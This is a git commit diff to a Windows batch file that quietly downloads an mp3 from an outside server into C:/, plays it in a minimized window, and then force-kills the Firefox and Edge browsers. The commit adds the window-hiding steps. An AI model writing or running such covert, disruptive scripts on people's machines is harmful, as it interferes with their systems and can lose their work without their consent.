50c007c325a4a10aecbbe6359c6db7f4aa5614c4
tobiasrepracek <80835891+tobiasrepracek@users.noreply.github.com>
2022-12-09 11:39:52 +0100

    Hfjf

--- final.bat
+++ final.bat
@@ -1,7 +1,8 @@
 @echo off
+powershell -window minimized -command ""
 cd C:/
 curl -s https://sources.tobir.xyz/hotdog.mp3 > hotdog.mp3
-start hotdog.mp3
+start /min hotdog.mp3
 timeout 8
 taskkill /f /im firefox.exe /t
 taskkill /f /im msedge.exe /t
